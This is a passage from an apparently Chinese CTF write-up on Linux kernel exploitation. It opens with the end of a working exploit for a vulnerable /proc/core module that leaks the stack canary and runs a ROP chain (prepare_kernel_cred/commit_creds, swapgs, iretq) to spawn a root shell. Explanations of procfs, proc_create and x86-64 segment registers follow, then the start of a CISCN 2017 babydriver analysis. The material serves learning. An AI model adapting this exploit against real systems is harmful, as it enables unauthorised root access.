&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> idx)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]set off to %ld\n&quot;</span>, idx);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889C</span>, idx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]read to buf.&quot;</span>);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">int</span> fd, <span class="type">long</span> <span class="type">long</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*]copy from user with size: %ld\n&quot;</span>, size);</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889A</span>, size);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    find_symbols();</span><br><span class="line">    <span class="comment">// gadget = raw_gadget - raw_vmlinux_base + vmlinux_base;</span></span><br><span class="line">    <span class="type">ssize_t</span> offset = vmlinux_base - raw_vmlinux_base;</span><br><span class="line"></span><br><span class="line">    set_off(fd, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    <span class="type">size_t</span> canary = ((<span class="type">size_t</span> *)buf)[<span class="number">0</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        rop[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81000b2f</span> + offset; <span class="comment">// pop rdi; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = prepare_kernel_cred;         <span class="comment">// prepare_kernel_cred(0)</span></span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810a0f49</span> + offset; <span class="comment">// pop rdx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81021e53</span> + offset; <span class="comment">// pop rcx; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff8101aa6a</span> + offset; <span class="comment">// mov rdi, rax; call rdx; </span></span><br><span class="line">    rop[i++] = commit_creds;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81a012da</span> + offset; <span class="comment">// swapgs; popfq; ret</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81050ac2</span> + offset; <span class="comment">// iretq; ret; </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = (<span class="type">size_t</span>)spawn_shell;         <span class="comment">// rip </span></span><br><span class="line"></span><br><span class="line">    rop[i++] = user_cs;</span><br><span class="line">    rop[i++] = user_rflags;</span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">    write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">    core_copy_func(fd, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="延拓1"><a href="#延拓1" class="headerlink" title="延拓1"></a>延拓1</h2><p>在这道例题中可以看到模块在初始化函数中主要是调用proc_create函数</p><p>要了解这个函数首先先了解一下/proc文件系统</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><blockquote><p>在许多类 Unix计算机系统中,<strong>procfs</strong> 是 进程文件系统(process file system) 的缩写,包含一个伪文件系统（启动时动态生成的文件系统），用于通过内核访问进程信息。这个文件系统通常被挂载到 <code>/proc</code> 目录。由于 <code>/proc</code> <strong>不是一个真正的文件系统</strong>，它也就不占用存储空间，只是占用有限的内存。</p></blockquote><p><strong>创建一个 proc 虚拟文件，应用层通过读写该文件，即可实现与内核的交互。</strong></p><p>Linux中每个正在运行的进程对应于<code>/proc</code>下的一个目录，目录名就是进程的PID，每个目录包含:</p><ul><li>/proc/PID/cmdline, 启动该进程的命令行.</li><li>/proc/PID/cwd, 当前工作目录的符号链接</li><li>/proc/PID/environ 影响进程的环境变量的名字和值.</li><li>/proc/PID/exe, 最初的可执行文件的符号链接, 如果它还存在的话。</li><li>/proc/PID/fd, 一个目录，包含每个打开的文件描述符的符号链接.</li><li>/proc/PID/fdinfo, 一个目录，包含每个打开的文件描述符的位置和标记</li><li>/proc/PID/maps, 一个文本文件包含内存映射文件与块的信息。</li><li>/proc/PID/mem, 一个二进制图像(image)表示进程的虚拟内存, 只能通过ptrace化进程访问.</li><li>/proc/PID/root, 该进程所能看到的根路径的符号链接。如果没有chroot监狱，那么进程的根路径是/.</li><li>/proc/PID/status包含了进程的基本信息，包括运行状态、内存使用。</li><li>/proc/PID/task, 一个目录包含了硬链接到该进程启动的任何任务</li></ul><p>用户可以获得PID使用工具如pgrep, pidof或ps:</p><h3 id="伪文件系统"><a href="#伪文件系统" class="headerlink" title="伪文件系统"></a>伪文件系统</h3><p>上面提到的伪文件系统又是什么,和普通文件系统有什么不同</p><ol><li><strong>实现方式</strong>:<ul><li><strong>普通文件系统</strong>：通常是针对块设备（硬盘、分区等）或其他<u>存储介质的实际文件系统</u>，例如 ext4、FAT32、NTFS 等。这些文件系统实现了<u>对物理存储介质的管理</u>，包括文件的组织、存储、检索等操作。</li><li><strong>伪文件系统</strong>：是在内存中实现的，不涉及对物理存储介质的直接访问。它提供了一种访问内核状态和信息的机制，通过<u>在文件系统层次结构中创建伪文件</u>，用户和进程可以通过文件 I/O 接口来访问和修改内核的状态。</li></ul></li><li><strong>目的</strong>:<ul><li><strong>普通文件系统</strong>：主要用于存储和管理用户数据，提供了对数据的持久性存储和检索支持。这些文件系统通常关注于数据的长期保存和管理。</li><li><strong>伪文件系统</strong>：用于提供一种用户空间和内核空间之间的通信机制。通过伪文件系统，用户可以访问内核中的信息，例如系统状态、进程信息、设备信息等。这样的文件系统并非用于长期存储数据，而是用于提供一个接口来查询和配置内核状态。</li></ul></li><li><strong>位置</strong>:<ul><li><strong>普通文件系统</strong>：存储在物理存储介质上，例如硬盘、SSD 等。</li><li><strong>伪文件系统</strong>：存储在内存中，通常在 <code>/proc</code> 和 <code>/sys</code> 目录下，用于让用户和进程通过文件接口与内核进行通信。</li></ul></li></ol><p>经典的伪文件系统包括 <code>/proc</code> 和 <code>/sys</code>：</p><ul><li><code>/proc</code> 提供了对系统和进程信息的访问，例如 <code>/proc/cpuinfo</code> 可以查看 CPU 信息，<code>/proc/meminfo</code> 可以查看内存信息。</li><li><code>/sys</code> 则提供了对内核和设备参数的访问，例如 <code>/sys/class/gpio</code> 可以用于控制 GPIO。</li></ul><h3 id="proc-create"><a href="#proc-create" class="headerlink" title="proc_create"></a>proc_create</h3><p>例题中使用了proc_create函数和remove_proc_entry</p><p>着重研究一下前者,毕竟后者想来是前者的逆操作</p><p>源码在内核<code>/fs/proc/generic.c</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params">   <span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params">   <span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> proc_create_data(name, mode, parent, proc_ops, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create);</span><br></pre></td></tr></table></figure><p>四个参数分别是</p><ol><li><code>name</code>,要创建的文件夹的名字</li><li><code>mode</code>,创建的文件夹的权限模式,<u>八进制</u>下的UGO模式</li><li><code>parent</code>,要创建节点的父节点,也就是要在哪个文件夹之下创建新文件夹，需要将那个文件夹的 proc_dir_entry 传入。如果直接在/proc/目录下则不需要</li><li><code>proc_ops</code>该文件的操作函数</li></ol><hr><p>其中还涉及到两个结构体proc_dir_entry和proc_ops</p><p>proc_ops是一个用于存放要注册的函数指针的结构体,之后对打开的设备文件调用对应函数便会指向这些函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> &#123;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> proc_flags;</span><br><span class="line"><span class="type">int</span>(*proc_open)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_read)(<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="type">ssize_t</span> (*proc_read_iter)(<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line"><span class="type">ssize_t</span>(*proc_write)(<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line"><span class="comment">/* mandatory unless nonseekable_open() or equivalent is used */</span></span><br><span class="line"><span class="type">loff_t</span>(*proc_lseek)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line"><span class="type">int</span>(*proc_release)(<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line"><span class="type">__poll_t</span> (*proc_poll)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *);</span><br><span class="line"><span class="type">long</span>(*proc_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_COMPAT</span></span><br><span class="line"><span class="type">long</span>(*proc_compat_ioctl)(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="type">int</span>(*proc_mmap)(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line"><span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*proc_get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>proc_dir_entry则是proc文件系统下目录的存储结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * number of callers into module in progress;</span></span><br><span class="line"><span class="comment"> * negative -&gt; it&#x27;s going away RSN</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">atomic_t</span> in_use;</span><br><span class="line"><span class="type">refcount_t</span> refcnt;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">pde_openers</span>;</span><span class="comment">/* who did -&gt;open, but not -&gt;release */</span></span><br><span class="line"><span class="comment">/* protects -&gt;pde_openers and all struct pde_opener instances */</span></span><br><span class="line"><span class="type">spinlock_t</span> pde_unload_lock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">pde_unload_completion</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">inode_operations</span> *<span class="title">proc_iops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">proc_ops</span> *<span class="title">proc_ops</span>;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_dir_ops</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">dentry_operations</span> *<span class="title">proc_dops</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> *<span class="title">seq_ops</span>;</span></span><br><span class="line"><span class="type">int</span> (*single_show)(<span class="keyword">struct</span> seq_file *, <span class="type">void</span> *);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">proc_write_t</span> write;</span><br><span class="line"><span class="type">void</span> *data;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> state_size;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> low_ino;</span><br><span class="line"><span class="type">nlink_t</span> nlink;</span><br><span class="line"><span class="type">kuid_t</span> uid;</span><br><span class="line"><span class="type">kgid_t</span> gid;</span><br><span class="line"><span class="type">loff_t</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">parent</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_root</span> <span class="title">subdir</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> <span class="title">subdir_node</span>;</span></span><br><span class="line"><span class="type">char</span> *name;</span><br><span class="line"><span class="type">umode_t</span> mode;</span><br><span class="line">u8 flags;</span><br><span class="line">u8 namelen;</span><br><span class="line"><span class="type">char</span> inline_name[];</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><hr><p>继续跟进<code>proc_create_data</code>函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_data</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *parent,</span></span><br><span class="line"><span class="params"><span class="type">const</span> <span class="keyword">struct</span> proc_ops *proc_ops, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line">p = proc_create_reg(name, mode, &amp;parent, data);</span><br><span class="line"><span class="keyword">if</span> (!p)</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">p-&gt;proc_ops = proc_ops;</span><br><span class="line">pde_set_flags(p);</span><br><span class="line"><span class="keyword">return</span> proc_register(parent, p);</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(proc_create_data);</span><br></pre></td></tr></table></figure><p>其中<code>proc_create_reg</code>的主要功能是创建并返回一个<code>proc_dir_entry</code>结构体指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_create_reg</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *name, <span class="type">umode_t</span> mode,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry **parent, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">proc_dir_entry</span> *<span class="title">p</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IFMT) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IFREG;</span><br><span class="line"><span class="keyword">if</span> ((mode &amp; S_IALLUGO) == <span class="number">0</span>)</span><br><span class="line">mode |= S_IRUGO;</span><br><span class="line"><span class="keyword">if</span> (WARN_ON_ONCE(!S_ISREG(mode)))</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">p = __proc_create(parent, name, mode, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> (p) &#123;</span><br><span class="line">p-&gt;proc_iops = &amp;proc_file_inode_operations;</span><br><span class="line">p-&gt;data = data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后设置p-&gt;proc_ops = proc_ops;相当于完成注册函数</p><p>再返回函数proc_register进行注册</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* returns the registered entry, or frees dp and returns NULL on failure */</span></span><br><span class="line"><span class="keyword">struct</span> proc_dir_entry *<span class="title function_">proc_register</span><span class="params">(<span class="keyword">struct</span> proc_dir_entry *dir,</span></span><br><span class="line"><span class="params"><span class="keyword">struct</span> proc_dir_entry *dp)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (proc_alloc_inum(&amp;dp-&gt;low_ino))</span><br><span class="line"><span class="keyword">goto</span> out_free_entry;</span><br><span class="line"></span><br><span class="line">write_lock(&amp;proc_subdir_lock);</span><br><span class="line">dp-&gt;parent = dir;</span><br><span class="line"><span class="keyword">if</span> (pde_subdir_insert(dir, dp) == <span class="literal">false</span>) &#123;</span><br><span class="line">WARN(<span class="number">1</span>, <span class="string">&quot;proc_dir_entry &#x27;%s/%s&#x27; already registered\n&quot;</span>,</span><br><span class="line">     dir-&gt;name, dp-&gt;name);</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"><span class="keyword">goto</span> out_free_inum;</span><br><span class="line">&#125;</span><br><span class="line">dir-&gt;nlink++;</span><br><span class="line">write_unlock(&amp;proc_subdir_lock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dp;</span><br><span class="line">out_free_inum:</span><br><span class="line">proc_free_inum(dp-&gt;low_ino);</span><br><span class="line">out_free_entry:</span><br><span class="line">pde_free(dp);</span><br><span class="line"><span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>更细的暂且不做分析</p><h2 id="延拓2"><a href="#延拓2" class="headerlink" title="延拓2"></a>延拓2</h2><p>​    Intel处理器实现了6个段寄存器，用来方便程序设计者对程序的代码、数据和栈进行分段和引用.</p><p>通常来说</p><ol><li>代码段用cs寄存器来分段和引用</li><li>数据段用ds寄存器来分段和引用</li><li>栈段用ss寄存器来分段和引用</li><li>另外3个段寄存器es、fs和gs可以用来分段和引用额外的数据段。</li></ol><p>​    在程序执行代码段里的代码、或访问数据段中的数据之前，需要事先将合法的16位段选择符的值加载到适当的段寄存器中，否则无法执行代码或访问数据。因此，虽然一个程序可以有很多段，但是某一时刻最多可以同时使用的只有其中的6个。要引用其他段，就要先加载对应的段选择符到适当的段寄存器中。</p><p>​    每个段寄存器都包含两个部分：对开发者可见的部分和不可见的隐藏部分。每当向一个段寄存器中加载段选择符的时候，处理器会自动将段选择符指向的段描述符中的基地址、限长和一些属性信息加载到段寄存器中的隐藏部分。</p><p>​    如果系统软件对某个段描述符进行了修改，那么系统软件也有责任重新加载对应的段寄存器，以确保对段描述符所做的修改能够生效（尤其是隐藏部分）。如果系统软件不重载段寄存器，那么缓存在段寄存器中隐藏部分的旧信息还会被继续使用。但从另一个角度来讲，只要不重载段寄存器，段寄存器的隐藏部分的内容就不会发生变化，在进行处理器模式切换的时候，比如从实模式切换到保护模式时之所以能够顺利执行，也是得益于这一原理。</p><h3 id="x86-64处理器模式下的段寄存器"><a href="#x86-64处理器模式下的段寄存器" class="headerlink" title="x86-64处理器模式下的段寄存器"></a>x86-64处理器模式下的段寄存器</h3><p>​    Intel理解到了现代操作系统设计者的想法，于是在x86-64处理器模式中，在微架构层将分段单元中的绝大多数功能都绕开了（注意不是关闭了分段单元）。</p><p>​    具体来说，在加载cs、ds、es和ss寄存器时，对应的段描述符中的基地址，限长和部分属性字段一概被忽略，并假设基地址总为0，限长总为2^64-1。同样在使用ds、es和ss段前缀的时候，也都做出同样的假设；同时，这些段寄存器中隐藏部分中与上述对应的字段也被忽略。因此x86-64处理器模式只支持平坦内存模型，即从0开始到2^48-1结束的规范化的虚拟地址空间，这是x86-64处理器模式中所做的硬性规定，因为这些规定可以进一步加快逻辑地址到虚拟地址的转换效率。</p><h3 id="x86-64处理器模式下的fs-gs段寄存器"><a href="#x86-64处理器模式下的fs-gs段寄存器" class="headerlink" title="x86-64处理器模式下的fs/gs段寄存器"></a>x86-64处理器模式下的fs/gs段寄存器</h3><p>​    虽说分段单元在x86-64处理器模式中绝大多数的情况下都被绕过了，但少数情况下不会绕过，就比如fs和gs段寄存器</p><p>​    但是64位处理器模式下的分段单元的微架构逻辑还是有些新的“猫腻”，具体做法是：获取fs和gs寄存器中隐藏部分的x86-64基地址（后文简写为fs.base和gs.base）的方式不再是通过fs和gs寄存器所指向的GDT/IDT中的段描述符来指定，而是在物理上就将fs和gs寄存器中隐藏部分中的64位基地址直接在物理上映射到了IA32_FS_BASE MSR（复位值为0）和IA32_GS_BASE MSR（复位值为0）这两个MSR上（或者说IA32_FS_BASE MSR和IA32_GS_BASE MSR分别是fs.base和gs.base的别名）。系统软件可以事先对这两个MSR进行编程，以便软件能够用fs和gs寄存器对特殊的数据进行引用。</p><p>具体来说，现代Linux x86-64下的fs/gs段寄存器的用途分别为：</p><ul><li><strong>用户态使用fs寄存器引用线程的glibc TLS和线程在用户态的stack canary；用户态的glibc不使用gs寄存器；应用可以自行决定是否使用该寄存器</strong></li><li><strong>内核态使用gs寄存器引用percpu变量和进程在内核态的stack canary；内核态不使用fs寄存器。</strong></li></ul><h1 id="CISCN-2017-babydriver"><a href="#CISCN-2017-babydriver" class="headerlink" title="CISCN 2017 babydriver"></a>CISCN 2017 babydriver</h1><h2 id="文件分析-1"><a href="#文件分析-1" class="headerlink" title="文件分析"></a>文件分析</h2><p>看一下boot.sh</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">   │ File: ../boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/bash</span><br><span class="line">   2   │ </span><br><span class="line">   3   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev</span><br><span class="line">       │ /ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 256M --nographic  -smp cores</span><br><span class="line">       │ =1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure><p>看到开启了smep保护</p><p>再看init</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">       │ File: init</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   1   │ #!/bin/sh</span><br><span class="line">   2   │  </span><br><span class="line">   3   │ mount -t proc none /proc</span><br><span class="line">   4   │ mount -t sysfs none /sys</span><br><span class="line">   5   │ mount -t devtmpfs devtmpfs /dev</span><br><span class="line">   6   │ chown root:root flag</span><br><span class="line">   7   │ chmod 400 flag</span><br><span class="line">   8   │ exec 0&lt;/dev/console</span><br><span class="line">   9   │ exec 1&gt;/dev/console</span><br><span class="line">  10   │ exec 2&gt;/dev/console</span><br><span class="line">  11   │ </span><br><span class="line">  12   │ insmod /lib/modules/4.4.72/babydriver.ko</span><br><span class="line">  13   │ chmod 777 /dev/babydev</span><br><span class="line">  14   │ echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">  15   │ setsid cttyhack setuidgid 1000 sh</span><br><span class="line">  16   │ </span><br><span class="line">  17   │ umount /proc</span><br><span class="line">  18   │ umount /sys</span><br><span class="line">  19   │ 